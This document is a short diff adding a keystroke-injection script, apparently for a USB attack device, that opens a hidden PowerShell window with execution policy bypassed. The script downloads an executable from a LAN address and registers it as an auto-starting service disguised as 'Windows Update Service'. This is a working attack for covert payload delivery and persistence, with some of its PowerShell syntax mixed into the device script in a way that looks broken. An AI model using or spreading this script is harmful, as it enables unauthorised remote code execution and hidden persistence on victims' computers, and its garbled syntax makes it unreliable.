@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Service persistence
+$string = @"
+`$serviceName = "WindowsUpdateService"
+`$servicePath = "$env:TEMP\wus.exe"
+Invoke-WebRequest -Uri "http://192.168.1.100/wus.exe" -OutFile $servicePath
+New-Service -Name $serviceName -BinaryPathName $servicePath -DisplayName "Windows Update Service" -StartupType Automatic
+Start-Service -Name $serviceName
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
